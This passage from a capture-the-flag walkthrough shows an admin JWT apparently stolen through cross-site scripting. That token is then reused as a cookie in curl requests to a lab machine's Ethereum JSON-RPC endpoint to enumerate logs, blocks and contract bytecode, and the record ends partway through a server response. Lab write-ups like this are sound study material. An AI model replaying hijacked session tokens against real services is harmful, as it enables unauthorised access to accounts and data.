- [https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp](https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp)
- [https://ethereum.org/en/developers/docs/apis/json-rpc/](https://ethereum.org/en/developers/docs/apis/json-rpc/)

![](images/2024-11-16_20-19_8545_message.png)

### Interacting with the Blockchain

There was a really good documentation on which `API endpoints` are available and how to `interact` with them on https://docs.alchemy.com.

- [https://docs.alchemy.com/reference/ethereum-api-endpoints](https://docs.alchemy.com/reference/ethereum-api-endpoints)

#### Signing the Token

First of all we needed to `sign` our `token`. To do this we went on https://jwt.io and entered the `token` we got through `Cross-Site Scripting (XSS)`.

- [https://jwt.io/](https://jwt.io/)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI4NzYyNywianRpIjoiMjkxYzM2ZGEtOGUxYi00OWQwLThlZjctNTQ4ODMwNjlmZmYzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjg3NjI3LCJleHAiOjE3MzI4OTI0Mjd9.cqmJAZdxppFBDTrH1GQMQHIYu5B6ExC2xoGeV1v1KDc
```

Then we used the `token` from the `endpoint` on `/api/json-rpc` to `sign` the `token`.

```c
c95c630c43cb43f9c5c3ae2c5d0ea186524e8641161fb10da7c963babb18991c
```

NOTICE: I reset the box at this point so the values changed. Please keep that in mind.

#### Blockchain Enumeration

It took a while to forge a valid `command` which worked properly. We started by investigating what was available and used `eth_getLogs` as our first `method`.

```c
$ curl -v -X POST \
-H "Content-Type: application/json" \
-H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g" \
-d '{
  "jsonrpc": "2.0",
  "method": "eth_getLogs",
  "params": [
    {
      "fromBlock": "0x0",
      "toBlock": "latest"
    }
  ],
  "id": 1
}' \
http://10.129.231.122:8545/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.231.122:8545...
* Connected to 10.129.231.122 (10.129.231.122) port 8545
* using HTTP/1.x
> POST / HTTP/1.1
> Host: 10.129.231.122:8545
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Type: application/json
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g
> Content-Length: 143
> 
* upload completely sent off: 143 bytes
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.12.3
< Date: Fri, 22 Nov 2024 18:04:52 GMT
< content-type: application/json
< Content-Length: 1269
< vary: origin, access-control-request-method, access-control-request-headers
< access-control-allow-origin: *
< date: Fri, 22 Nov 2024 18:04:52 GMT
< Connection: close
< 
{"jsonrpc":"2.0","id":1,"result":[{"address":"0x75e41404c8c1de0c2ec801f06fbf5ace8662240f","topics":["0xda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98"],"data":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000056b65697261000000000000000000000000000000000000000000000000000000","blockHash":"0x41665059a36a58495d5cd33cc49a299122e8068ce3ab31b2cb32f3cc13d99dc6","blockNumber":"0x1","blockTimestamp":"0x6740c0ec","transactionHash":"0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281","transactionIndex":"0x0","logIndex":"0x0","removed":false},{"address":"0x75e41404c8c1de0c2ec801f06fbf5ace8662240f","topics":["0xda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98"],"data":"0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000006666f6f6261720000000000000000000000000000000000000000000000000000","blockHash":"0x3d24147f79d6eebb7d* shutting down connection #0
1d336102929d79cfd4a7707d86b1429e64cd8f28c3ea80","blockNumber":"0xd","blockTimestamp":"0x6740c1bc","transactionHash":"0xd2a43b968759aa6900ec405d1c9e179855650dc37a46b5addccfa5a37b4afbc0","transactionIndex":"0x0","logIndex":"0x0","removed":false}]}
```

Then we moved forward and used `eth_getBlockByNumber` to `iterate` using `HEX values` through the `Blockchain`. We started with `0xd` for actually whatever reason.

```c
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST \
-H "Content-Type: application/json" \
-H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g" \
-d '{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0xd",
    true
  ],
  "id": 1
}' \
http://10.129.231.122:8545/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.231.122:8545...
* Connected to 10.129.231.122 (10.129.231.122) port 8545
* using HTTP/1.x
> POST / HTTP/1.1
> Host: 10.129.231.122:8545
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Type: application/json
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g
> Content-Length: 108
> 
* upload completely sent off: 108 bytes
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.12.3
< Date: Fri, 22 Nov 2024 18:23:23 GMT
< content-type: application/json
< Content-Length: 2529
< vary: origin, access-control-request-method, access-control-request-headers
< access-control-allow-origin: *
< date: Fri, 22 Nov 2024 18:23:23 GMT
< Connection: close
< 
{"jsonrpc":"2.0","id":1,"result":{"hash":"0x3d24147f79d6eebb7d1d336102929d79cfd4a7707d86b1429e64cd8f28c3ea80","parentHash":"0x9eba16fe048f75596a3479133cf8688bcd9e51f14577269ad2a63ce1e72fad42","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","miner":"0x0000000000000000000000000000000000000000","stateRoot":"0x9fc591001172ec460908260b1596dc343c0a43b03134246e705517b513da564c","transactionsRoot":"0x0aa4a760e3ba773237e828869e31beacf6c2a4d7124fc1feffd6c214bf8a3655","receiptsRoot":"0x09dce478a6170167bf78472ff3f42608092ca3ad1ec655adc24c91b91a816121","logsBloom":"0x00100000000000000000000000000000000000000000000000000000000000000000000000000000008000000010000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","difficulty":"0x0","number":"0xd","gasLimit":"0x1c9c380","gasUsed":"0x16ce6","timestamp":"0x6740c1bc","totalDifficulty":"0x0","extraData":"0x","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","baseFeePerGas":"0xc5996cd","blobGasUsed":"0x0","excessBlobGas":"0x0","uncles":[],"transactions":[{"hash":"0xd2a43b968759aa6900ec405d1c9e179855650dc37a46b5addccfa5a37b4afbc0","nonce":"0xc","blockHash":"0x3d24147f79d6eebb7d1d336102929d79cfd4a7707d86b1429e64cd8f28c3ea80","blockNumber":"0xd","transactionIndex":"0x0","from":"0xb795dc8a5674250b602418e7f804cd162f03338b","to":"0x75e41404c8c1de0c2ec801f06fbf5ace8662240f","value":"0x0","gasPrice":"0xc5996cd","gas":"0x2f386","maxFeePerGas":"0xc5996cd","maxPriorityFeePerGas":"0x0","input":"0xddc7b6a700000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000* shutting down connection #0
0000000000000000000000000000000000000000000000006666f6f62617200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006666f6f6261720000000000000000000000000000000000000000000000000000","r":"0xdc7c03be78ef552388ae63274ad79b98a60508a721b0078f4f66a1961b2e88bc","s":"0x6dc903a97449df6482ebb7e7aeb7994dc4f2b829d4c4b30a5851c3e655234dce","v":"0x0","yParity":"0x0","chainId":"0x7a69","accessList":[],"type":"0x2"}],"size":"0x33f"}}
```

Next in line was `0x0` which also gave us back a huge blob of `HEX data`.

```c
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST \
-H "Content-Type: application/json" \
-H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g" \
-d '{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x0",
    true
  ],     
  "id": 1
}' \
http://10.129.231.122:8545/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.231.122:8545...
* Connected to 10.129.231.122 (10.129.231.122) port 8545
* using HTTP/1.x
> POST / HTTP/1.1
> Host: 10.129.231.122:8545
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Type: application/json
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g
> Content-Length: 108
> 
* upload completely sent off: 108 bytes
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.12.3
< Date: Fri, 22 Nov 2024 18:29:11 GMT
< content-type: application/json
< Content-Length: 1473
< vary: origin, access-control-request-method, access-control-request-headers
< access-control-allow-origin: *
< date: Fri, 22 Nov 2024 18:29:11 GMT
< Connection: close
< 
{"jsonrpc":"2.0","id":1,"result":{"hash":"0x709e88bbb0812ac787fef86f5dd4715b1c833574d616f91dd34c258d36605107","parentHash":"0x0000000000000000000000000000000000000000000000000000000000000000","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","miner":"0x0000000000000000000000000000000000000000","stateRoot":"0x0000000000000000000000000000000000000000000000000000000000000000","transactionsRoot":"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421","receiptsRoot":"0x0000000000000000000000000000000000000000000000000000000000000000","logsBloom":"0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000* shutting down connection #0
00000000000000000000000000000000000000000000000000000000000000000000000000000000000","difficulty":"0x0","number":"0x0","gasLimit":"0x1c9c380","gasUsed":"0x0","timestamp":"0x6740c0e9","totalDifficulty":"0x0","extraData":"0x","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","baseFeePerGas":"0x3b9aca00","blobGasUsed":"0x0","excessBlobGas":"0x0","uncles":[],"transactions":[],"size":"0x205"}}
```

On value `0x1` and `0x2` then we found an enormous amount of data all in `HEX` we started to analyze.

```c
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST \
-H "Content-Type: application/json" \
-H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g" \
-d '{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x1",
    true
  ],     
  "id": 1
}' \
http://10.129.231.122:8545/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.231.122:8545...
* Connected to 10.129.231.122 (10.129.231.122) port 8545
* using HTTP/1.x
> POST / HTTP/1.1
> Host: 10.129.231.122:8545
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Type: application/json
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g
> Content-Length: 108
> 
* upload completely sent off: 108 bytes
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.3 Python/3.12.3
< Date: Fri, 22 Nov 2024 18:30:30 GMT
< content-type: application/json
< Content-Length: 14912
< vary: origin, access-control-request-method, access-control-request-headers
< access-control-allow-origin: *
< date: Fri, 22 Nov 2024 18:30:30 GMT
< Connection: close
< 
{"jsonrpc":"2.0","id":1,"result":{"hash":"0x41665059a36a58495d5cd33cc49a299122e8068ce3ab31b2cb32f3cc13d99dc6","parentHash":"0x709e88bbb0812ac787fef86f5dd4715b1c833574d616f91dd34c258d36605107","sha3Uncles":"0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347","miner":"0x0000000000000000000000000000000000000000","stateRoot":"0xebaa4051da301381c125aaf9ace65e1c8c1f0258edcbf9333eb28a716edc62d0","transactionsRoot":"0xfc2e916e53e98b9d81c89fa3d887765aedff45559a0f52585ae6bf25e389e759","receiptsRoot":"0x5dc85a9ce0651081f8f776085a3f97537975c954485aafeefdbfdc5484b7504a","logsBloom":"0x00100000000000000000000000000000000000000000000000000000000000000000000000000000008000000010000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000","difficulty":"0x0","number":"0x1","gasLimit":"0x1c9c380","gasUsed":"0x127c32","timestamp":"0x6740c0ec","totalDifficulty":"0x0","extraData":"0x","mixHash":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0000000000000000","baseFeePerGas":"0x3b9aca00","blobGasUsed":"0x0","excessBlobGas":"0x0","uncles":[],"transactions":[{"hash":"0x95125517a48dcf4503a067c29f176e646ae0b7d54d1e59c5a7146baf6fa93281","nonce":"0x0","blockHash":"0x41665059a36a58495d5cd33cc49a299122e8068ce3ab31b2cb32f3cc13d99dc6","blockNumber":"0x1","transactionIndex":"0x0","from":"0xb795dc8a5674250b602418e7f804cd162f03338b","to":null,"value":"0x0","gasPrice":"0x3b9aca00","gas":"0x127c32","maxFeePerGas":"0x77359400","maxPriorityFeePerGas":"0x0","input":"0x60a060405234801561001057600080fd5b5060405161184538038061184583398101604081905261002f9161039a565b60405180606001604052808281526020016040518060400160405280600581526020016430b236b4b760d91b8152508152602001600115158152506001604051610084906430b236b4b760d91b815260050190565b908152604051908190036020019020815181906100a1908261048c565b50602082015160018201906100b6908261048c565b50604091909101516002909101805460ff1916911515919091179055336080526100e082826100e7565b505061060e565b6080516001600160a01b0316336001600160a01b0316146101595760405162461bcd60e51b815260206004820152602160248201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6044820152603760f91b60648201526084015b60405180910390fd5b6040805160208101825260009052517fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a4709060019061019890859061054a565b9081526040519081900360200181206101b091610566565b6040518091039020146102055760405162461bcd60e51b815260206004820152601760248201527f557365726e616d6520616c7265616479206578697374730000000000000000006044820152606401610150565b6040518060600160405280828152602001604051806040016040528060048152602001633ab9b2b960e11b81525081526020016001151581525060018360405161024f919061054a565b9081526040519081900360200190208151819061026c908261048c565b5060208201516001820190610281908261048c565b50604091820151600291909101805460ff1916911515919091179055517fda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98906102cb9084906105db565b60405180910390a15050565b634e487b7160e01b600052604160045260246000fd5b60005b838110156103085781810151838201526020016102f0565b50506000910152565b600082601f83011261032257600080fd5b81516001600160401b0381111561033b5761033b6102d7565b604051601f8201601f19908116603f011681016001600160401b0381118282101715610369576103696102d7565b60405281815283820160200185101561038157600080fd5b6103928260208301602087016102ed565b949350505050565b600080604083850312156103ad57600080fd5b82516001600160401b038111156103c357600080fd5b6103cf85828601610311565b602085015190935090506001600160401b038111156103ed57600080fd5b6103f985828601610311565b9150509250929050565b600181811c9082168061041757607f821691505b60208210810361043757634e487b7160e01b600052602260045260246000fd5b50919050565b601f82111561048757806000526020600020601f840160051c810160208510156104645750805b601f840160051c820191505b818110156104845760008155600101610470565b50505b505050565b81516001600160401b038111156104a5576104a56102d7565b6104b9816104b38454610403565b8461043d565b6020601f8211600181146104ed57600083156104d55750848201515b600019600385901b1c1916600184901b178455610484565b600084815260208120601f198516915b8281101561051d57878501518255602094850194600190920191016104fd565b508482101561053b5786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b6000825161055c8184602087016102ed565b9190910192915050565b600080835461057481610403565b60018216801561058b57600181146105a0576105d0565b60ff19831686528115158202860193506105d0565b86600052602060002060005b838110156105c8578154888201526001909101906020016105ac565b505081860193505b509195945050505050565b60208152600082518060208401526105fa8160408501602087016102ed565b601f01601f19169190910160400192915050565b60805161120061064560003960008181610138015281816102ef0152818161055a01528181610792015261090601526112006000f3fe608060405234801561001057600080fd5b506004361061007d5760003560e01c8063507b4e791161005b578063507b4e79146100e1578063c5a6f18a146100f4578063d5e363f914610107578063ddc7b6a71461011a57600080fd5b80632c8b07661461008257806336980d3a146100975780634518f6b3146100bf575b600080fd5b610095610090366004610b53565b61012d565b005b6100aa6100a5366004610bc2565b6102ae565b60405190151581526020015b60405180910390f35b6100d26100cd366004610bc2565b6102e0565b6040516100b693929190610c53565b6100956100ef366004610c96565b61054f565b610095610102366004610d39565b61070c565b610095610115366004610bc2565b610787565b610095610128366004610e0c565b6108fb565b336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461017e5760405162461bcd60e51b815260040161017590610e73565b60405180910390fd5b83838080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050604051600192506101c591508390610eb4565b9081526040519081900360200190206002015460ff166101f75760405162461bcd60e51b815260040161017590610ed0565b60018585604051610209929190610efd565b9081526040519081900360200190206002015460ff1661023b5760405162461bcd60e51b815260040161017590610ed0565b82826001878760405161024f929190610efd565b9081526020016040518091039020600101918261026d929190610f96565b507f67560143af7aa0dc03e270b21c2067bb6cd8dd3f413c896d199590708b6e6366858560405161029f929190611055565b60405180910390a15050505050565b6000600183836040516102c2929190610efd565b9081526040519081900360200190206002015460ff16905092915050565b60608080336001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000161461032c5760405162461bcd60e51b815260040161017590610e73565b84848080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250506040516001925061037391508390610eb4565b9081526040519081900360200190206002015460ff166103a55760405162461bcd60e51b815260040161017590610ed0565b8585600188886040516103b9929190610efd565b908152604051908190036020018120906001906103d9908b908b90610efd565b908152602001604051809103902060010183838080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050845492965093945091925083915061043590610f0d565b80601f016020809104026020016040519081016040528092919081815260200182805461046190610f0d565b80156104ae5780601f10610483576101008083540402835291602001916104ae565b820191906000526020600020905b81548152906001019060200180831161049157829003601f168201915b505050505091508080546104c190610f0d565b80601f01602080910402602001604051908101604052809291908181526020018280546104ed90610f0d565b801561053a5780601f1061050f5761010080835404028352916020019161053a565b820191906000526020600020905b81548152906001019060200180831161051d57829003601f168201915b50505050509050935093509350509250925092565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146105975760405162461bcd60e51b815260040161017590610e73565b85858080601f01602080910402602001604051908101604052809392919081815260200183838082843760009201919091525050604051600192506105de91508390610eb4565b9081526040519081900360200190206002015460ff166106105760405162461bcd60e51b815260040161017590610ed0565b8484604051610620929190610efd565b60405180910390206001888860405161063a929190610efd565b90815260405190819003602001812061065291611084565b60405180910390201461069a5760405162461bcd60e51b815260206004820152601060248201526f125b9d985b1a59081c185cdcdddbdc9960821b6044820152606401610175565b8282600189896040516106ae929190610efd565b908152604051908190036020019020916106c9919083610f96565b507fd0b43b0b96083c98cc0f0370575812de87ee48ff1bde30bcd74f3518443bc4f587876040516106fb929190611055565b60405180910390a150505050505050565b6000546001600160a01b0316156107655760405162461bcd60e51b815260206004820152601860248201527f43686174206164647265737320616c72656164792073657400000000000000006044820152606401610175565b600080546001600160a01b0319166001600160a01b0392909216919091179055565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146107cf5760405162461bcd60e51b815260040161017590610e73565b600182826040516107e1929190610efd565b9081526040519081900360200190206002015460ff166108135760405162461bcd60e51b815260040161017590610ed0565b60018282604051610825929190610efd565b90815260405190819003602001902060006108408282610ab5565b61084e600183016000610ab5565b50600201805460ff191690556000546040516304d0d87d60e31b81526001600160a01b0390911690632686c3e89061088c9085908590600401611055565b600060405180830381600087803b1580156108a657600080fd5b505af11580156108ba573d6000803e3d6000fd5b505050507f68621f32198be2aabd285ff157a36182342ebc518a0e054c08a1461ae0d8643182826040516108ef929190611055565b60405180910390a15050565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146109435760405162461bcd60e51b815260040161017590610e73565b6040805160208101825260009052517fc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a47090600190610982908590610eb4565b90815260405190819003602001812061099a91611084565b6040518091039020146109ef5760405162461bcd60e51b815260206004820152601760248201527f557365726e616d6520616c7265616479206578697374730000000000000000006044820152606401610175565b6040518060600160405280828152602001604051806040016040528060048152602001633ab9b2b960e11b815250815260200160011515815250600183604051610a399190610eb4565b90815260405190819003602001902081518190610a5690826110f9565b5060208201516001820190610a6b90826110f9565b50604091820151600291909101805460ff1916911515919091179055517fda4cf7a387add8659e1865a2e25624bbace24dd4bc02918e55f150b0e460ef98906108ef9084906111b7565b508054610ac190610f0d565b6000825580601f10610ad1575050565b601f016020900490600052602060002090810190610aef9190610af2565b50565b5b80821115610b075760008155600101610af3565b5090565b60008083601f840112610b1d57600080fd5b5081356001600160401b03811115610b3457600080fd5b602083019150836020828501011115610b4c57600080fd5b9250929050565b60008060008060408587031215610b6957600080fd5b84356001600160401b03811115610b7f57600080fd5b610b8b87828801610b0b565b90955093505060208501356001600160401b03811115610baa57600080fd5b610bb687828801610b0b565b95989497509550505050565b60008060208385031215610bd557600080fd5b82356001600160401b03811115610beb57600080fd5b610bf785828601610b0b565b90969095509350505050565b60005b83811015610c1e578181015183820152602001610c06565b50506000910152565b60008151808452610c3f816020860160208601610c03565b601f01601f19169290920160200192915050565b606081526000610c666060830186610c27565b8281036020840152610c788186610c27565b90508281036040840152610c8c8185610c27565b9695505050505050565b60008060008060008060608789031215610caf57600080fd5b86356001600160401b03811115610cc557600080fd5b610cd189828a01610b0b565b90975095505060208701356001600160401b03811115610cf057600080fd5b610cfc89828a01610b0b565b90955093505060408701356001600160401b03811115610d1b57600080fd5b610d2789828a01610b0b565b979a9699509497509295939492505050565b600060208284031215610d4b57600080fd5b81356001600160a01b0381168114610d6257600080fd5b9392505050565b634e487b7160e01b600052604160045260246000fd5b600082601f830112610d9057600080fd5b81356001600160401b03811115610da957610da9610d69565b604051601f8201601f19908116603f011681016001600160401b0381118282101715610dd757610dd7610d69565b604052818152838201602001851015610def57600080fd5b816020850160208301376000918101602001919091529392505050565b60008060408385031215610e1f57600080fd5b82356001600160401b03811115610e3557600080fd5b610e4185828601610d7f565b92505060208301356001600160401b03811115610e5d57600080fd5b610e6985828601610d7f565b9150509250929050565b60208082526021908201527f4f6e6c79206f776e65722063616e2063616c6c20746869732066756e6374696f6040820152603760f91b606082015260800190565b60008251610ec6818460208701610c03565b9190910192915050565b602080825260139082015272155cd95c88191bd95cc81b9bdd08195e1a5cdd606a1b604082015260600190565b8183823760009101908152919050565b600181811c90821680610f2157607f821691505b602082108103610f4157634e487b7160e01b600052602260045260246000fd5b50919050565b601f821115610f9157806000526020600020601f840160051c81016020851015610f6e5750805b601f840160051c820191505b81811015610f8e5760008155600101610f7a565b50505b505050565b6001600160401b03831115610fad57610fad610d69565b610fc183610fbb8354610f0d565b83610f47565b6000601f841160018114610ff55760008515610fdd5750838201355b600019600387901b1c1916600186901b178355610f8e565b600083815260209020601f19861690835b828110156110265786850135825560209485019460019092019101611006565b50868210156110435760001960f88860031b161c19848701351681555b505060018560011b0183555050505050565b60208152816020820152818360408301376000818301604090810191909152601f909201601f19160101919050565b600080835461109281610f0d565b6001821680156110a957600181146110be576110ee565b60ff19831686528115158202860193506110ee565b86600052602060002060005b838110156110e6578154888201526001909101906020016110ca565b505081860193505b509195945050505050565b81516001600160401b0381111561111257611112610d69565b611126816111208454610f0d565b84610f47565b6020601f82116001811461115a57600083156111425750848201515b600019600385901b1c1916600184901b178455610f8e565b600084815260208120601f198516915b8281101561118a578785015182556020948501946001909201910161116a565b50848210156111a85786840151600019600387901b60f8161c191681555b50505050600190811b01905550565b602081526000610d626020830184610c2756fea26469706673582212200c0ba374423cb74ab14e407a07f561fb4e33aad841f07036fac601e322900b4464736f6c634300081a0033000000000000000000000000000000000000000000000000* shutting down connection #0
0000000000000040000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000056b65697261000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a536f6d65646179426974436f696e57696c6c436f6c6c61707365000000000000","r":"0x4f4ad415e28b86460c19fe844a722c1db7ac58d44fc7b4621970e6d38ce89cd8","s":"0xdd890e41ee3dbfe385f6f5efce82161a579f7b33360351dfc89da9ac40d711c","v":"0x1","yParity":"0x1","chainId":"0x7a69","accessList":[],"type":"0x2"}],"size":"0x1b6d"}
```

```c
┌──(kali㉿kali)-[~]
└─$ curl -v -X POST \
-H "Content-Type: application/json" \
-H "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g" \
-d '{
  "jsonrpc": "2.0",
  "method": "eth_getBlockByNumber",
  "params": [
    "0x2",
    true
  ],     
  "id": 1
}' \
http://10.129.231.122:8545/

Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 10.129.231.122:8545...
* Connected to 10.129.231.122 (10.129.231.122) port 8545
* using HTTP/1.x
> POST / HTTP/1.1
> Host: 10.129.231.122:8545
> User-Agent: curl/8.10.1
> Accept: */*
> Content-Type: application/json
> Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczMjI5NzgxNiwianRpIjoiMjc4ZDNkNjktZTZkOS00NDdiLTk5MDMtY2Q2YjU3M2E4MzUxIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzMyMjk3ODE2LCJleHAiOjE3MzI5MDI2MTZ9.64NYmoX6MCuFlZVxfsxSHaNf806uA_1uXZOp1n90H9g
> Content-Length: 108
> 
* upload completely sent off: 108 bytes
< HTTP/1.1 200 OK
